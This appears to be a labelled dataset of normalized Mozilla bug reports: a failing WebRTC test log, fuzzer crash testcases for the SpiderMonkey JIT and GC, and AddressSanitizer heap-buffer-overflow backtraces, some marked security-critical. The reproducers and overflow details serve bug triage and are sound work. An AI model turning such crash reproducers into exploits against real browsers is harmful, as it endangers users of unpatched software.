14:21:20 info 82 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html a valid string reason is expected 14:21:20 info 83 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html reason can not be empty 14:21:20 info 84 info network setup is not required 14:21:20 info 85 info creating peerconnectionwrapper pclocal 14:21:20 info 86 info creating peerconnectionwrapper pcremote 14:21:20 info 87 info run step 1 pc_setup_signaling_client 14:21:20 info 88 info run step 2 pc_local_setup_ice_logger 14:21:20 info 89 info run step 3 pc_remote_setup_ice_logger 14:21:20 info 90 info run step 4 pc_local_setup_signaling_logger 14:21:20 info 91 info run step 5 pc_remote_setup_signaling_logger 14:21:20 info 92 info run step 6 pc_local_setup_addstream_handler 14:21:20 info 93 info run step 7 pc_remote_setup_addstream_handler 14:21:20 info 94 info run step 8 pc_local_check_initial_signalingstate 14:21:20 info 95 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html initial local signalingstate is stable 14:21:20 info 96 info run step 9 pc_remote_check_initial_signalingstate 14:21:20 info 97 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html initial remote signalingstate is stable 14:21:20 info 98 info run step 10 pc_local_check_initial_ice_state 14:21:20 info 99 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html initial local ice connection state is new 14:21:20 info 100 info run step 11 pc_remote_check_initial_ice_state 14:21:20 info 101 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html initial remote ice connection state is new 14:21:20 info 102 info run step 12 pc_local_gum 14:21:20 info 103 info get 1 local streams 14:21:20 info 104 info call getusermedia for video true 14:21:20 info 105 info peerconnectionwrapper pclocal gum local stream 478b1c81-5d72-41df-96c0-5e9f92b141e7 with video track 46d110b5-d173-48da-a968-af8bdad25f3a 14:21:20 info 106 info got media stream video local 14:21:20 info 107 info peerconnectionwrapper pclocal onnegotiationneeded event fired 14:21:20 info 108 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html addstream adds sender 14:21:20 info 109 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html track has id 14:21:20 info 110 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html track has kind 14:21:20 info 111 info run step 13 pc_remote_gum 14:21:20 info 112 info get 1 local streams 14:21:20 info 113 info call getusermedia for video true 14:21:20 info 114 info canplaythrough fired for media element pclocal_local1_video 14:21:20 info 115 info peerconnectionwrapper pcremote gum local stream b8722e28-22b1-4e76-a597-f173e582cffb with video track 4a224b3d-43b4-4f0b-be1c-2d390b13e39e 14:21:20 info 116 info got media stream video local 14:21:20 info 117 info peerconnectionwrapper pcremote onnegotiationneeded event fired 14:21:20 info 118 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html addstream adds sender 14:21:20 info 119 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html track has id 14:21:20 info 120 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html track has kind 14:21:20 info 121 info run step 14 pc_local_setup_ice_handler 14:21:20 info 122 info run step 15 pc_remote_setup_ice_handler 14:21:20 info 123 info run step 16 pc_local_steeplechase_signal_expected_local_tracks 14:21:20 info 124 info run step 17 pc_remote_steeplechase_signal_expected_local_tracks 14:21:20 info 125 info run step 18 pc_local_get_expected_remote_tracks 14:21:20 info 126 info run step 19 pc_remote_get_expected_remote_tracks 14:21:20 info 127 info run step 20 pc_local_create_offer 14:21:20 info 128 info got offer type offer sdp v=0\r\no=mozilla this_is_sdparta-40.0a1 5543845458266036880 0 in ip4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=fingerprint sha-256 ba f1 ad:7c:5c:8b:0c d8:5e c9 b4 cf:1f:6a da:6a:8b f4:31:91 d3:58 eb:7c c1 b3 fe:84 e4 d4 eb:75\r\na=group bundle sdparta_0\r\na=ice-options trickle\r\na=msid-semantic wms r\nm=video 9 rtp/savpf 120 126 97\r\nc=in ip4 0.0.0.0\r\na=sendrecv\r\na=fmtp:120 max-fs=12288 max-fr=60\r\na=fmtp:126 profile-level-id=42e01f level-asymmetry-allowed=1 packetization-mode=1\r\na=fmtp:97 profile-level-id=42e01f level-asymmetry-allowed=1\r\na=ice-pwd d7d27fcd8d71d483c2b5d8946083e374\r\na=ice-ufrag dbca644f\r\na=mid sdparta_0\r\na=msid 478b1c81-5d72-41df-96c0-5e9f92b141e7 46d110b5-d173-48da-a968-af8bdad25f3a r\na=rtcp-fb:120 nack\r\na=rtcp-fb:120 nack pli\r\na=rtcp-fb:120 ccm fir\r\na=rtcp-fb:120 ccm tmmbr\r\na=rtcp-fb:126 nack\r\na=rtcp-fb:126 nack pli\r\na=rtcp-fb:126 ccm fir\r\na=rtcp-fb:126 ccm tmmbr\r\na=rtcp-fb:97 nack\r\na=rtcp-fb:97 nack pli\r\na=rtcp-fb:97 ccm fir\r\na=rtcp-fb:97 ccm tmmbr\r\na=rtcp-mux\r\na=rtpmap:120 vp8/90000\r\na=rtpmap:126 h264/90000\r\na=rtpmap:97 h264/90000\r\na=setup actpass\r\na=ssrc:3358678933 cname 36afb69d-826e-4856-a59e-3a7fd6158083 r\n 14:21:20 info 129 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html local create offer does not change signaling state 14:21:20 info 130 info run step 21 pc_local_steeplechase_signal_offer 14:21:20 info 131 info run step 22 pc_local_set_local_description 14:21:20 info 132 info peerconnectionwrapper pclocal onsignalingstatechange event fired 14:21:20 info 133 info peerconnectionwrapper pclocal signalingstatechange event received 14:21:20 info 134 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html peerconnectionwrapper pclocal legal signaling state transition from stable to have-local-offer 14:21:20 info 135 info peerconnectionwrapper pclocal successfully set the local description 14:21:20 info 136 info test-pass dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html signalingstate after local setlocaldescription is have-local-offer 14:21:20 info 137 info run step 23 pc_remote_get_offer 14:21:20 info 138 info run step 24 pc_remote_set_remote_description 14:21:20 warning test-unexpected-fail dom/media/tests/mochitest/test_peerconnection_addsecondvideostream.html application terminated with exit code 5 14:21:20 info runtests.py application ran for 0:04:26.759346 14:21:20 info zombiecheck reading pid log tmp/tmpshevnlpidlog 14:21:20 info process 3573 launched child process 3624 14:21:20 info zombiecheck checking for orphan process with pid 3624 14:21:20 info stopping web server 14:21:20 info stopping web socket server 14:21:20 info stopping ssltunnel 14:21:20 info test-info leakcheck default process leak threshold set at 0 bytes 14:21:20 info test-info leakcheck plugin process leak threshold set at 0 bytes 14:21:20 info test-info leakcheck tab process leak threshold set at 25000 bytes 14:21:20 info test-info leakcheck geckomediaplugin process leak threshold set at 20000 bytes 14:21:20 warning test-unexpected-fail leakcheck tab process missing output line for total leaks 14:21:20 info test-info leakcheck missing output line from log file tmp/tmpm6nvjk.mozrunner/runtests_leaks_tab_pid3624.log 14:21:20 warning test-unexpected-fail leakcheck default process missing output line for total leaks 14:21:20 info test-info leakcheck missing output line from log file tmp/tmpm6nvjk.mozrunner/runtests_leaks.log 14:21:20 info runtests.py running tests end 14:21:20 info suite-end took 280s 14:21:20 error return code 251 14:21:20 error no tests run or test summary not found 14:21:20 info tinderboxprint mochitest-plain-chunked br em class testfail t-fail em 14:21:20 warning tbpl failure 14:21:20 warning the mochitest suite plain-chunked ran with return status failure 14:21:20 info running post-action listener package_coverage_data 14:21:20 info running post-action listener resource_record_post_action 14:21:20 info running post-run listener resource_record_post_run 14:21:21 info total resource usage wall time 305s cpu 100.0 read bytes 2818048 write bytes 168591360 read time 100 write time 253432 14:21:21 info install wall time 24s cpu 100.0 read bytes 0 write bytes 98234368 read time 0 write time 205244 14:21:21 info run-tests wall time 282s cpu 100.0 read bytes 2785280 write bytes 62238720 read time 100 write time 24496 14:21:21 info running post-run listener upload_blobber_files 14:21:21 info blob upload gear active	11
crash js jit rvalueallocation index const with heap-buffer-overflow the following testcase crashes on mozilla-central revision 98820360ab66 build with enable-gczeal enable-optimize o2 g enable-address-sanitizer enable-posix-nspr-emulation disable-jemalloc disable-tests disable-debug run with fuzzing-safe thread-count=2 ion-eager function f return f.caller.p var lfglobal newglobal for lflocal in this if lflocal in lfglobal lfglobal lflocal this lflocal function dummy test function test function t o proplist var obj_12 f get t test lfglobal.offthreadcompilescript dummy.tosource dummy lfglobal.runoffthreadscript backtrace 43399==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 in js jit rvalueallocation index const js/src/jit/jitframes.cpp:2267 1 in js jit snapshotiterator allocationvalue js jit rvalueallocation const js jit snapshotiterator readmethod js/src/jit/jitframes.cpp:1995 2 in js jit inlineframeiterator callee js jit maybereadfallback const js/src/jit/jitframes.cpp:2509 3 in js frameiter callee jscontext const js/src/vm/stack.cpp:1108 4 in callergetterimpl jscontext js callargs js/src/jsfun.cpp:265 5 in bool js callnongenericmethod isfunction js handle js value callergetterimpl jscontext js callargs jscontext js callargs js/src/opt64asan/js/src dist/include/js/callnongenericmethod.h:100 6 in callergetter jscontext unsigned int js value js/src/jsfun.cpp:297 7 in js jit docallnativegetter jscontext js handle jsfunction js handle jsobject js mutablehandle js value js/src/jit/baselineic.cpp:1618 is located 0 bytes to the right of 16-byte region allocated by thread t0 here 0 in interceptor_malloc srv/repos/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:74 1 in js_malloc unsigned long js/src/opt64asan/js/src dist/include/js/utility.h:126 2 in zl13js_pod_mallocin2js14relocatableptrin2js5valueeeeept_m js/src/opt64asan/js/src dist/include/js/utility.h:281 3 in js relocatableptr js value js systemallocpolicy pod_malloc js relocatableptr js value unsigned long js/src/jsalloc.h:34 4 in mozilla vectorbase js relocatableptr js value 1ul js systemallocpolicy mozilla vector js relocatableptr js value 1ul js systemallocpolicy converttoheapstorage unsigned long js/src/opt64asan/js/src dist/include/mozilla/vector.h:772 5 in mozilla vectorbase js relocatableptr js value 1ul js systemallocpolicy mozilla vector js relocatableptr js value 1ul js systemallocpolicy growstorageby unsigned long js/src/opt64asan/js/src dist/include/mozilla/vector.h:863 6 in mozilla uniqueptr mozilla vector js relocatableptr js value 1ul js systemallocpolicy js deletepolicy mozilla vector js relocatableptr js value 1ul js systemallocpolicy operator bool const js/src/opt64asan/js/src dist/include/mozilla/vector.h:924 7 in js jit rinstructionresults init jscontext unsigned int js/src/jit/jitframes.cpp:1711 8 in js jit snapshotiterator computeinstructionresults jscontext js jit rinstructionresults const js/src/jit/jitframes.cpp:2222 9 in js jit snapshotiterator initinstructionresults js jit maybereadfallback js/src/jit/jitframes.cpp:2199 10 in js jit snapshotiterator mayberead js jit rvalueallocation const js jit maybereadfallback js/src/jit/jitframes.cpp:2026 11 in js jit inlineframeiterator callee js jit maybereadfallback const js/src/jit/jitframes.cpp:2509 12 in js frameiter callee jscontext const js/src/vm/stack.cpp:1108 13 in callergetterimpl jscontext js callargs js/src/jsfun.cpp:265 14 in bool js callnongenericmethod isfunction js handle js value callergetterimpl jscontext js callargs jscontext js callargs js/src/opt64asan/js/src dist/include/js/callnongenericmethod.h:100 15 in callergetter jscontext unsigned int js value js/src/jsfun.cpp:297 16 in js jit docallnativegetter jscontext js handle jsfunction js handle jsobject js mutablehandle js value js/src/jit/baselineic.cpp:1618 17 in enterbaseline jscontext js jit enterjitdata js/src/jit/baselinejit.cpp:124 18 in js jit enterbaselinemethod jscontext js runstate js/src/jit/baselinejit.cpp:156 19 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:642 20 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:722 21 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:759 22 in js directproxyhandler call jscontext js handle jsobject js callargs const const js/src/proxy/directproxyhandler.cpp:77 23 in js crosscompartmentwrapper call jscontext js handle jsobject js callargs const const js/src/proxy/crosscompartmentwrapper.cpp:289 24 in js proxy call jscontext js handle jsobject js callargs const js/src/proxy/proxy.cpp:391 25 in js proxy_call jscontext unsigned int js value js/src/proxy/proxy.cpp:697 26 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:235 27 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:695 28 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:759 29 in js jit invokefunction jscontext js handle jsobject unsigned int js value js mutablehandle js value js/src/jit/vmfunctions.cpp:75 summary addresssanitizer heap-buffer-overflow js/src/jit/jitframes.cpp:2267 js jit rvalueallocation index const shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 fa fa fd fa fa fa 00 05 fa fa fd fa fa fa fd fd fa fa 00 07 fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fd fa fa 00 01 fa fa fd fd fa fa 00 fa fa fa fd fd fa fa fd fd fa fa fd fa fa fa fd fd fa fa 00 06 fa fa fd fd fa fa fd fa fa fa 00 07 fa fa 00 00 fa fa fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 contiguous container oob fc asan internal fe 43399==aborting marking s-s and sec-critical due to heap-buffer-overflow	11
replaying a htmlmediaelement streamed over a peerconnection can crash webrtc from bug 1171907 when i try to play a captured media element streaming over a peerconnection that has ended stream has not ended we crash here frame 0 xul mozilla webrtcaudioconduit validatecodecconfig mozilla audiocodecconfig const bool const inlined std string size const 4 at basic_string.h:606 frame 1 xul mozilla webrtcaudioconduit validatecodecconfig mozilla audiocodecconfig const bool const inlined std string empty const at basic_string.h:686 frame 2 xul mozilla webrtcaudioconduit validatecodecconfig this codecinfo send=true const 25 at audioconduit.cpp:1031 frame 3 xul mozilla webrtcaudioconduit configuresendmediacodec this codecconfig 101 at audioconduit.cpp:364 frame 4 xul mozilla mediapipelinetransmit pipelinelistener processvideochunk this unavailable conduit unavailable chunk unavailable 3107 at mediapipeline.cpp:1229 frame 5 xul mozilla mediapipelinetransmit pipelinelistener newdata this graph unavailable tid unavailable offset unavailable events unavailable media 989 at mediapipeline.cpp:958 frame 6 xul mozilla mediapipelinetransmit pipelinelistener notifyqueuedtrackchanges this unavailable graph unavailable tid unavailable offset unavailable events unavailable queued_media unavailable 808 at mediapipeline.cpp:894 frame 7 xul mozilla trackunionstream copytrackdata this ainputtrack amapindex unavailable afrom unavailable ato=649728 aoutputtrackfinished 714 at trackunionstream.cpp:286	11
assertion failure entry.isjs at vm/spsprofiler.cpp:365 or crash markinternal jsatom the following testcase crashes on mozilla-central revision c1c6840d9255 build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal disable-debug run with fuzzing-safe thread-count=2 function printstatus msg var lines msg.split n for var i=0 i lines.length i unescape lines i function toprinted value value string value value value.replace n/g nl replace n/g nl function reportcompare expected actual toprinted expected toprinted actual evaluate gczeal 14 noscriptrval true compileandgo true enablespsprofiling test function test printstatus reportcompare false reportcompare false test 17 backtrace program received signal sigsegv segmentation fault markinternal jsatom trc thingp at js/src/gc/marking.cpp:276 276 if isinsidenursery thing 0 markinternal jsatom trc thingp at js/src/gc/marking.cpp:276 1 in jsscript markchildren this trc at js/src/jsscript.cpp:3402 2 in markchildren trc script at js/src/gc/marking.cpp:1356 3 pushmarkstack thing gcmarker at js/src/gc/marking.cpp:1101 4 markinternal jsscript trc thingp optimized out at js/src/gc/marking.cpp:294 5 in trace trc this jsfunction const object function arraystaticreduce at js/src/jsfun.cpp:773 6 fun_trace trc obj jsobject object function arraystaticreduce at js/src/jsfun.cpp:786 7 in js gcmarker processmarkstacktop this budget at js/src/gc/marking.cpp:1831 8 in js gcmarker drainmarkstack this budget at js/src/gc/marking.cpp:1894 9 in drainmarkstack phase=js gcstats phase_mark slicebudget this at js/src/jsgc.cpp:5225 10 js gc gcruntime incrementalcollectslice this budget reason optimized out at js/src/jsgc.cpp:5893 11 in js gc gcruntime gccycle this incremental=false budget reason=js gcreason debug_gc at js/src/jsgc.cpp:6113 12 in js gc gcruntime collect this incremental=false budget reason=js gcreason debug_gc at js/src/jsgc.cpp:6238 13 in gc reason=js gcreason debug_gc gckind=gc_shrink this at js/src/jsgc.cpp:6299 14 js gc gcruntime rundebuggc this at js/src/jsgc.cpp:6687 15 in js gc checkallocatorstate js allowgc 1 cx optimized out kind optimized out at js/src/jsgcinlines.h:447 16 in checkallocatorstate js allowgc 1 cx kind optimized out at js/src/jsgcinlines.h:419 17 allocatenonobject jsstring js allowgc 1 cx at js/src/jsgcinlines.h:538 18 newgcstring js allowgc 1 cx at js/src/jsgcinlines.h:627 19 new js allowgc 1 cx at js/src/vm/string-inl.h:266 20 allocateinlinestring js allowgc 1 unsigned char chars synthetic pointer len optimized out cx at js/src/vm/string-inl.h:31 21 newinlinestring js allowgc 1 unsigned char chars cx at js/src/vm/string-inl.h:57 22 js newstringcopyndontdeflate js allowgc 1 unsigned char cx s nan n=3 at js/src/vm/string.cpp:1011 23 in newstringcopyn js allowgc 1 n optimized out s nan cx at js/src/vm/string.h:1140 24 newstringcopyz js allowgc 1 s nan cx at js/src/vm/string.h:1160 25 js_numbertostringwithbase js allowgc 1 cx d optimized out base=10 at js/src/jsnum.cpp:1313 26 in js tostringslow js allowgc 1 cx arg at js/src/jsstr.cpp:4186 27 in tostring js allowgc 1 v cx at js/src/jsstr.h:152 28 addoperation res=jsval_void rhs jsval lhs jsval nan cx at js/src/vm/interpreter.cpp:1245 29 js addvalues cx lhs jsval nan rhs jsval res=jsval_void at js/src/vm/interpreter.cpp:3874 30 in js jit dobinaryarithfallback cx frame stub lhs jsval nan rhs jsval ret at js/src/jit/baselineic.cpp:2416 31 in 32 in 33 in 34 in 35 in js jit dotonumberfallbackinfo 52 in rax 140702951407592 rbx 23879768 rcx 23714 rdx 11447912 rsi 23995144 rdi 140702950481536 rbp 23879768 rsp 140737488339568 r8 17179869696 r9 23995128 r10 257 r11 1 r12 2 r13 140737310233152 r14 1 r15 140737488355327 rip markinternal jsatom jstracer jsatom 76 markinternal jsatom jstracer jsatom 76 testb rax markinternal jsatom jstracer jsatom 79 jne markinternal jsatom jstracer jsatom 49 marking s-s because this is a gc crash	11
crash in js jit lrecoverinfo appendresumepoint this bug was filed from the socorro interface and is report bp-721e86d9-1968-43db-855c-106452151105 1 2 crash js jit lrecoverinfo appendresumepoint appears to be windows linux and osx beta/43 aurora/44 nighty/45 automation only reproduced on debug though i found the same waiting for the page to complete loading with an opt build reproduced in bughunter and manually on windows 7 opt-asan builds on linux have stacks like inlinespaghettistackiterator begin storesbegin js jit lrecoverinfo appendresumepoint js jit mresumepoint init	11
bmp heap-overflow crash mozilla image downscaler commitrow the following testcase crashes on mozilla-inbound-linux64-asan revision df12438d4091e89409a5449b067867e57c24858b see attachment backtrace 1781==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t23 imgdecoder 4 0 in mozilla image downscaler commitrow builds/slave/m-in-l64-asan-0000000000000000/build/src/image/downscaler.cpp:204 1 in mozilla image nsbmpdecoder finishrow builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:325 2 in mozilla image nsbmpdecoder readpixelrow char const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:733 3 in mozilla image nsbmpdecoder writeinternal char const unsigned int 0 operator mozilla image nsbmpdecoder state char const unsigned long const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:355 4 in lex lambda at builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:346:33 builds/slave/m-in-l64-asan-0000000000000000/build/src/image/streaminglexer.h:288 5 in mozilla image nsbmpdecoder writeinternal char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:346 6 in mozilla image decoder write char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:183 7 in mozilla image nsicodecoder writetocontaineddecoder char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:738 8 in readbmp builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:506 9 in mozilla image nsicodecoder writeinternal char const unsigned int 1 operator mozilla image icostate char const unsigned long const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:706 10 in lex lambda at builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:689:16 builds/slave/m-in-l64-asan-0000000000000000/build/src/image/streaminglexer.h:297 11 in mozilla image nsicodecoder writeinternal char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:688 12 in mozilla image decoder write char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:183 13 in mozilla image decoder decode mozilla image iresumable builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:128 14 in mozilla image decodepool decode mozilla image decoder builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:453 15 in mozilla image decodepoolworker run builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:282 16 in nsthread processnextevent bool bool builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:964 17 in ns_processnextevent nsithread bool builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nsthreadutils.cpp:297 18 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/glue/messagepump.cpp:326 19 in runinternal builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:234 20 in runhandler builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:227 21 in messageloop run builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:201 22 in nsthread threadfunc void builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:376 23 in pt_root builds/slave/m-in-l64-asan-0000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:212 24 in start_thread lib/x86_64-linux-gnu/libpthread.so.0 is located 0 bytes to the right of 48-byte region allocated by thread t23 imgdecoder 4 here 0 in interceptor_malloc builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:74 1 in moz_xmalloc builds/slave/m-in-l64-asan-0000000000000000/build/src/memory/mozalloc/mozalloc.cpp:83 2 in operator new builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/image dist/include/mozilla/mozalloc.h:198 3 in makeunique unsigned char builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/image dist/include/mozilla/uniqueptr.h:642 4 in mozilla image downscaler beginframe mozilla gfx intsizetyped mozilla gfx unknownunits const mozilla maybe mozilla gfx intrecttyped mozilla gfx unknownunits const unsigned char bool bool builds/slave/m-in-l64-asan-0000000000000000/build/src/image/downscaler.cpp:118 5 in mozilla image nsbmpdecoder readinfoheaderrest char const unsigned long builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:555 6 in mozilla image nsbmpdecoder writeinternal char const unsigned int 0 operator mozilla image nsbmpdecoder state char const unsigned long const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:351 7 in lex lambda at builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:346:33 builds/slave/m-in-l64-asan-0000000000000000/build/src/image/streaminglexer.h:288 8 in mozilla image nsbmpdecoder writeinternal char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsbmpdecoder.cpp:346 9 in mozilla image decoder write char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:183 10 in mozilla image nsicodecoder writetocontaineddecoder char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:738 11 in mozilla image nsicodecoder readbih char const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:472 12 in mozilla image nsicodecoder writeinternal char const unsigned int 1 operator mozilla image icostate char const unsigned long const builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:704 13 in lex lambda at builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:689:16 builds/slave/m-in-l64-asan-0000000000000000/build/src/image/streaminglexer.h:288 14 in mozilla image nsicodecoder writeinternal char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoders/nsicodecoder.cpp:688 15 in mozilla image decoder write char const unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:183 16 in mozilla image decoder decode mozilla image iresumable builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decoder.cpp:128 17 in mozilla image decodepool decode mozilla image decoder builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:453 18 in mozilla image decodepoolworker run builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:282 19 in nsthread processnextevent bool bool builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:964 20 in ns_processnextevent nsithread bool builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nsthreadutils.cpp:297 21 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/glue/messagepump.cpp:326 22 in runinternal builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:234 23 in runhandler builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:227 24 in messageloop run builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:201 25 in nsthread threadfunc void builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:376 26 in pt_root builds/slave/m-in-l64-asan-0000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:212 27 in start_thread lib/x86_64-linux-gnu/libpthread.so.0 thread t23 imgdecoder 4 created by t0 web content here 0 in pthread_create builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:175 1 in pr_createthread builds/slave/m-in-l64-asan-0000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:453 2 in pr_createthread builds/slave/m-in-l64-asan-0000000000000000/build/src/nsprpub/pr/src/pthreads/ptthread.c:544 3 in nsthread init builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthread.cpp:496 4 in nsthreadmanager newthread unsigned int unsigned int nsithread builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/threads/nsthreadmanager.cpp:249 5 in ns_newthread nsithread nsirunnable unsigned int builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nsthreadutils.cpp:71 6 in mozilla image decodepool decodepool builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:355 7 in mozilla image decodepool singleton builds/slave/m-in-l64-asan-0000000000000000/build/src/image/decodepool.cpp:315 8 in mozilla image initmodule builds/slave/m-in-l64-asan-0000000000000000/build/src/image/build/nsimagemodule.cpp:95 9 in load builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:882 10 in nsfactoryentry getfactory builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:1913 11 in nscomponentmanagerimpl createinstancebycontractid char const nsisupports nsid const void builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:1216 12 in nscomponentmanagerimpl getservicebycontractid char const nsid const void builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/components/nscomponentmanager.cpp:1575 13 in callgetservice builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nscomponentmanagerutils.cpp:67 14 in nsgetservicebycontractid operator nsid const void const builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nscomponentmanagerutils.cpp:280 15 in nscomptr_base assign_from_gs_contractid nsgetservicebycontractid nsid const builds/slave/m-in-l64-asan-0000000000000000/build/src/xpcom/glue/nscomptr.cpp:103 16 in nscomptr builds/slave/m-in-l64-asan-0000000000000000/build/src/obj-firefox/gfx/thebes dist/include/nscomptr.h:540 17 in gfxplatform init builds/slave/m-in-l64-asan-0000000000000000/build/src/gfx/thebes/gfxplatform.cpp:617 18 in gfxplatform getplatform builds/slave/m-in-l64-asan-0000000000000000/build/src/gfx/thebes/gfxplatform.cpp:455 19 in mozilla dom contentprocess init builds/slave/m-in-l64-asan-0000000000000000/build/src/dom/ipc/contentprocess.cpp:83 20 in xre_initchildprocess builds/slave/m-in-l64-asan-0000000000000000/build/src/toolkit/xre/nsembedfunctions.cpp:603 21 in content_process_main int char builds/slave/m-in-l64-asan-0000000000000000/build/src/ipc/app contentproc/plugin-container.cpp:237 22 lib/x86_64-linux-gnu/libc.so.6 summary addresssanitizer heap-buffer-overflow builds/slave/m-in-l64-asan-0000000000000000/build/src/image/downscaler.cpp:204 